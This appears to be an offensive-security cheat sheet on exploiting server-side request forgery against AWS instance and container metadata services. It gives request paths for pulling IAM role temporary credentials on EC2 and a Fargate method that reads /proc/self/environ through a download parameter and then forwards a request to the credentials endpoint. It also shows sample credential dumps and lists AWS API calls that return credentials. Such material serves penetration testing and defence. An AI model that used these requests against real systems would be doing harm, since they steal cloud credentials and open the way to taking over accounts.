# AWS - Metadata SSRF

> AWS released additional security defences against the attack.

:warning: Only working with IMDSv1.
Enabling IMDSv2 : `aws ec2 modify-instance-metadata-options --instance-id <INSTANCE-ID> --profile <AWS_PROFILE> --http-endpoint enabled --http-token required`.

In order to use IMDSv2 you must provide a token.

```powershell
export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "http://169.254.169.254/latest/api/token"`
curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "http://169.254.169.254/latest/meta-data"
```


## Method for Elastic Cloud Compute (EC2)

Amazon provides an internal service that allows every EC2 instance to query and retrieve metadata about the host. If you discover an SSRF vulnerability running on an EC2 instance, try to fetch the content from 169.254.169.254.

1. Access the IAM : [http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)
    ```powershell
    ami-id
    ami-launch-index
    ami-manifest-path
    block-device-mapping/
    events/
    hostname
    iam/
    identity-credentials/
    instance-action
    instance-id
    ```
2. Find the name of the role assigned to the instance : [http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/)
3. Extract the role's temporary keys : [http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM_USER_ROLE_HERE>/](http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM_USER_ROLE_HERE>/)
    ```powershell
    {
    "Code" : "Success",
    "LastUpdated" : "2019-07-31T23:08:10Z",
    "Type" : "AWS-HMAC",
    "AccessKeyId" : "ASIAREDACTEDXXXXXXXX",
    "SecretAccessKey" : "XXXXXXXXXXXXXXXXXXXXXX",
    "Token" : "AgoJb3JpZ2luX2VjEDU86Rcfd/34E4rtgk8iKuTqwrRfOppiMnv",
    "Expiration" : "2019-08-01T05:20:30Z"
    }
    ```


## Method for Container Service (Fargate)

1. Fetch the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI variable from https://awesomeapp.com/download?file=/proc/self/environ
    ```powershell
    JAVA_ALPINE_VERSION=8.212.04-r0
    HOSTNAME=bbb3c57a0ed3SHLVL=1PORT=8443HOME=/root
    AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447
    AWS_EXECUTION_ENV=AWS_ECS_FARGATEMVN_VER=3.3.9JAVA_VERSION=8u212AWS_DEFAULT_REGION=us-west-2
    ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/cb4f6285-48f2-4a51-a787-67dbe61c13ffPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin:/usr/lib/mvn:/usr/lib/mvn/binLANG=C.UTF-8AWS_REGION=us-west-2Tag=48111bbJAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jreM2=/usr/lib/mvn/binPWD=/appM2_HOME=/usr/lib/mvnLD_LIBRARY_PATH=/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjd
    ```
2. Use the credential URL to dump the AccessKey and SecretKey : https://awesomeapp.com/forward?target=http://169.254.170.2/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447
    ```powershell
    {
        "RoleArn": "arn:aws:iam::953574914659:role/awesome-waf-role",
        "AccessKeyId": "ASIAXXXXXXXXXX",
        "SecretAccessKey": "j72eTy+WHgIbO6zpe2DnfjEhbObuTBKcemfrIygt",
        "Token": "FQoGZXIvYXdzEMj/////...jHsYXsBQ==",
        "Expiration": "2019-09-18T04:05:59Z"
    }
    ```


## AWS API calls that return credentials

- [chime:createapikey](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazonchime.html)
- [codepipeline:pollforjobs](https://docs.aws.amazon.com/codepipeline/latest/APIReference/API_PollForJobs.html)
- [cognito-identity:getopenidtoken](https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_GetOpenIdToken.html)
- [cognito-identity:getopenidtokenfordeveloperidentity](https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_GetOpenIdTokenForDeveloperIdentity.html)
- [cognito-identity:getcredentialsforidentity](https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_GetCredentialsForIdentity.html)
- [connect:getfederationtoken](https://docs.aws.amazon.com/connect/latest/APIReference/API_GetFederationToken.html)
- [connect:getfederationtokens](https://docs.aws.amazon.com/connect/latest/APIReference/API_GetFederationToken.html)
- [ecr:getauthorizationtoken](https://docs.aws.amazon.com/AmazonECR/latest/APIReference/API_GetAuthorizationToken.html)
- [gamelift:requestuploadcredentials](https://docs.aws.amazon.com/gamelift/latest/apireference/API_RequestUploadCredentials.html)
- [iam:createaccesskey](https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateAccessKey.html)
- [iam:createloginprofile](https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateLoginProfile.html)
- [iam:createservicespecificcredential](https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateServiceSpecificCredential.html)
- [iam:resetservicespecificcredential](https://docs.aws.amazon.com/IAM/latest/APIReference/API_ResetServiceSpecificCredential.html)
- [iam:updateaccesskey](https://docs.aws.amazon.com/IAM/latest/APIReference/API_UpdateAccessKey.html)
- [lightsail:getinstanceaccessdetails](https://docs.aws.amazon.com/lightsail/2016-11-28/api-reference/API_GetInstanceAccessDetails.html)
- [lightsail:getrelationaldatabasemasteruserpassword](https://docs.aws.amazon.com/lightsail/2016-11-28/api-reference/API_GetRelationalDatabaseMasterUserPassword.html)
- [rds-db:connect](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/UsingWithRDS.IAMDBAuth.IAMPolicy.html)
- [redshift:getclustercredentials](https://docs.aws.amazon.com/redshift/latest/APIReference/API_GetClusterCredentials.html)
- [sso:getrolecredentials](https://docs.aws.amazon.com/singlesignon/latest/PortalAPIReference/API_GetRoleCredentials.html)
- [mediapackage:rotatechannelcredentials](https://docs.aws.amazon.com/mediapackage/latest/apireference/channels-id-credentials.html)
- [mediapackage:rotateingestendpointcredentials](https://docs.aws.amazon.com/mediapackage/latest/apireference/channels-id-ingest_endpoints-ingest_endpoint_id-credentials.html)
- [sts:assumerole](https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role.html)
- [sts:assumerolewithsaml](https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-saml.html)
- [sts:assumerolewithwebidentity](https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-web-identity.html)
- [sts:getfederationtoken](https://docs.aws.amazon.com/cli/latest/reference/sts/get-federation-token.html)
- [sts:getsessiontoken](https://docs.aws.amazon.com/cli/latest/reference/sts/get-session-token.html)


## References

* [AWS API calls that return credentials - kmcquade](https://gist.github.com/kmcquade/33860a617e651104d243c324ddf7992a)
* [Cloud security instance metadata - PumaScan - Eric Johnson - 09 Oct 2019](https://pumascan.com/resources/cloud-security-instance-metadata/)
* [Getting started with Version 2 of AWS EC2 Instance Metadata service (IMDSv2) - Sunesh Govindaraj - Nov 25, 2019](https://blog.appsecco.com/getting-started-with-version-2-of-aws-ec2-instance-metadata-service-imdsv2-2ad03a1f3650)
* [Privilege escalation in the Cloud: From SSRF to Global Account Administrator - Maxime Leblanc - Sep 1, 2018](https://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6)
* [Getting shell and data access in AWS by chaining vulnerabilities - Riyaz Walikar - Aug 29, 2019 ](https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed)